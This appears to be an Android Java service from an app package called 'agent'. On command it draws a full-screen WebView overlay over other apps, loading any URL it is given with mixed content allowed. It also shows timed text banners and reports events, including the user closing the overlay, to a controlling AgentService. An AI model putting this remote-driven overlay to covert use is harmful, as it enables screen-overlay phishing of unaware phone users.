package com.rk.agent;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;

public class OverlayService extends Service {

    static final String TAG = "OVERLAY_SVC";

    public static final String ACTION_SHOW = "com.rk.agent.OVERLAY_SHOW";
    public static final String ACTION_HIDE = "com.rk.agent.OVERLAY_HIDE";
    public static final String ACTION_TEXT = "com.rk.agent.OVERLAY_TEXT";
    public static final String EXTRA_URL = "url";
    public static final String EXTRA_TEXT = "text";
    public static final String EXTRA_TEXT_DURATION = "text_duration";
    public static final String EXTRA_TEXT_STYLE = "text_style";

    WindowManager wm;
    View overlayView;
    View textOverlayView;
    WebView webView;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        } catch (Exception e) {
            Log.e(TAG, "wm err: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            startFgIfNeeded();

            if (intent != null) {
                String a = intent.getAction();
                if (ACTION_SHOW.equals(a)) {
                    String url = intent.getStringExtra(EXTRA_URL);
                    showOverlay(url);
                } else if (ACTION_HIDE.equals(a)) {
                    hideOverlay();
                    hideTextOverlay();
                } else if (ACTION_TEXT.equals(a)) {
                    String text = intent.getStringExtra(EXTRA_TEXT);
                    int duration = intent.getIntExtra(EXTRA_TEXT_DURATION, 5);
                    String style = intent.getStringExtra(EXTRA_TEXT_STYLE);
                    showTextOverlay(text, duration, style);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "onStart err: " + e.getMessage());
        }
        return START_NOT_STICKY;
    }

    private void startFgIfNeeded() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationManager nm = (NotificationManager)
                    getSystemService(NOTIFICATION_SERVICE);
                if (nm != null && nm.getNotificationChannel("overlay") == null) {
                    NotificationChannel ch = new NotificationChannel(
                        "overlay", "Display", NotificationManager.IMPORTANCE_MIN);
                    nm.createNotificationChannel(ch);
                }
                Notification n = new Notification.Builder(this, "overlay")
                    .setContentTitle("Display")
                    .setContentText("Overlay active")
                    .setSmallIcon(android.R.drawable.ic_menu_view)
                    .setOngoing(true)
                    .build();
                startForeground(3, n);
            }
        } catch (Exception e) {
            Log.e(TAG, "fg err: " + e.getMessage());
        }
    }

    private boolean hasOverlayPermission() {
        try {
            if (Build.VERSION.SDK_INT >= 23)
                return Settings.canDrawOverlays(this);
        } catch (Exception ignored) {}
        return true;
    }

    private int overlayType() {
        if (Build.VERSION.SDK_INT >= 26)
            return WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        return WindowManager.LayoutParams.TYPE_PHONE;
    }

    private void showOverlay(String url) {
        try {
            if (!hasOverlayPermission()) {
                Log.e(TAG, "no overlay permission");
                try {
                    AgentService.sendFromNotif("overlay", "error",
                        "overlay permission not granted");
                } catch (Exception ignored) {}
                stopMe();
                return;
            }

            if (overlayView != null) {
                if (webView != null && url != null && !url.isEmpty()) {
                    webView.loadUrl(url);
                }
                return;
            }

            final FrameLayout root = new FrameLayout(this);
            root.setBackgroundColor(Color.BLACK);
            root.setFocusableInTouchMode(true);
            root.setFocusable(true);

            webView = new WebView(this);
            WebSettings ws = webView.getSettings();
            ws.setJavaScriptEnabled(true);
            ws.setDomStorageEnabled(true);
            ws.setLoadWithOverviewMode(true);
            ws.setUseWideViewPort(true);
            ws.setBuiltInZoomControls(true);
            ws.setDisplayZoomControls(false);
            ws.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
            webView.setWebViewClient(new WebViewClient());
            if (url != null && !url.isEmpty()) webView.loadUrl(url);

            root.addView(webView, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));

            root.setOnKeyListener(new View.OnKeyListener() {
                @Override public boolean onKey(View v, int keyCode, KeyEvent event) {
                    if (event.getAction() == KeyEvent.ACTION_DOWN
                        && keyCode == KeyEvent.KEYCODE_BACK) {
                        try {
                            if (webView != null && webView.canGoBack()) {
                                webView.goBack();
                                return true;
                            }
                        } catch (Exception ignored) {}
                        try {
                            AgentService.sendFromNotif("overlay", "closed",
                                "user closed overlay");
                        } catch (Exception ignored) {}
                        hideOverlay();
                        return true;
                    }
                    return false;
                }
            });

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                overlayType(),
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT);
            params.gravity = Gravity.TOP | Gravity.START;

            wm.addView(root, params);
            overlayView = root;
            root.requestFocus();
        } catch (Exception e) {
            Log.e(TAG, "showOverlay err: " + e.getMessage());
            try {
                AgentService.sendFromNotif("overlay", "error",
                    "show failed: " + e.getMessage());
            } catch (Exception ignored) {}
            hideOverlay();
        }
    }

    private void hideOverlay() {
        try {
            if (overlayView != null && wm != null) wm.removeView(overlayView);
        } catch (Exception ignored) {}
        overlayView = null;
        try {
            if (webView != null) { webView.stopLoading(); webView.destroy(); }
        } catch (Exception ignored) {}
        webView = null;

        if (textOverlayView == null) stopMe();
    }

    private void showTextOverlay(String text, int durationSec, String style) {
        try {
            if (!hasOverlayPermission()) {
                Log.e(TAG, "no overlay permission (text)");
                try {
                    AgentService.sendFromNotif("overlay", "error",
                        "overlay permission not granted");
                } catch (Exception ignored) {}
                stopMe();
                return;
            }
            if (text == null || text.isEmpty()) return;
            if (durationSec < 1) durationSec = 3;
            if (durationSec > 60) durationSec = 60;

            hideTextOverlay();

            final FrameLayout root = new FrameLayout(this);

            LinearLayout container = new LinearLayout(this);
            container.setOrientation(LinearLayout.VERTICAL);
            container.setPadding(50, 40, 50, 40);

            GradientDrawable bg = new GradientDrawable();
            bg.setShape(GradientDrawable.RECTANGLE);
            bg.setCornerRadius(30);

            int bgColor = 0xFF000000;
            int textColor = Color.WHITE;
            int textSize = 18;

            if (style != null) {
                String s = style.toLowerCase();
                if (s.equals("info") || s.equals("blue")) bgColor = 0xFF2196F3;
                else if (s.equals("success") || s.equals("green")) bgColor = 0xFF4CAF50;
                else if (s.equals("warn") || s.equals("orange")) bgColor = 0xFFFF9800;
                else if (s.equals("error") || s.equals("red")) bgColor = 0xFFF44336;
                else if (s.equals("light")) { bgColor = 0xFFF5F5F5; textColor = 0xFF000000; }
                else if (s.equals("big")) textSize = 26;
            }

            bg.setColor(bgColor);
            container.setBackground(bg);

            TextView tv = new TextView(this);
            tv.setText(text);
            tv.setTextColor(textColor);
            tv.setTextSize(textSize);
            tv.setGravity(Gravity.CENTER);
            tv.setPadding(20, 20, 20, 20);
            tv.setMaxWidth(900);
            tv.setMaxLines(10);
            container.addView(tv);

            FrameLayout.LayoutParams containerParams = new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT);
            containerParams.gravity = Gravity.CENTER_HORIZONTAL | Gravity.TOP;
            containerParams.topMargin = 100;
            root.addView(container, containerParams);

            int flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                      | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                      | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                flags |= WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;
            }

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                overlayType(),
                flags,
                PixelFormat.TRANSLUCENT);
            params.gravity = Gravity.TOP | Gravity.START;
            params.y = 100;

            wm.addView(root, params);
            textOverlayView = root;

            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override public void run() { hideTextOverlay(); }
            }, durationSec * 1000L);

        } catch (Exception e) {
            Log.e(TAG, "showText err: " + e.getMessage());
            try {
                AgentService.sendFromNotif("overlay", "text error", e.getMessage());
            } catch (Exception ignored) {}
            hideTextOverlay();
        }
    }

    private void hideTextOverlay() {
        try {
            if (textOverlayView != null && wm != null) {
                wm.removeView(textOverlayView);
            }
        } catch (Exception ignored) {}
        textOverlayView = null;

        if (overlayView == null) stopMe();
    }

    void stopMe() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(STOP_FOREGROUND_REMOVE);
            } else {
                stopForeground(true);
            }
        } catch (Exception ignored) {}
        try { stopSelf(); } catch (Exception ignored) {}
    }

    @Override
    public void onDestroy() {
        try {
            if (overlayView != null && wm != null) wm.removeView(overlayView);
        } catch (Exception ignored) {}
        try {
            if (textOverlayView != null && wm != null) wm.removeView(textOverlayView);
        } catch (Exception ignored) {}
        overlayView = null;
        textOverlayView = null;
        webView = null;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
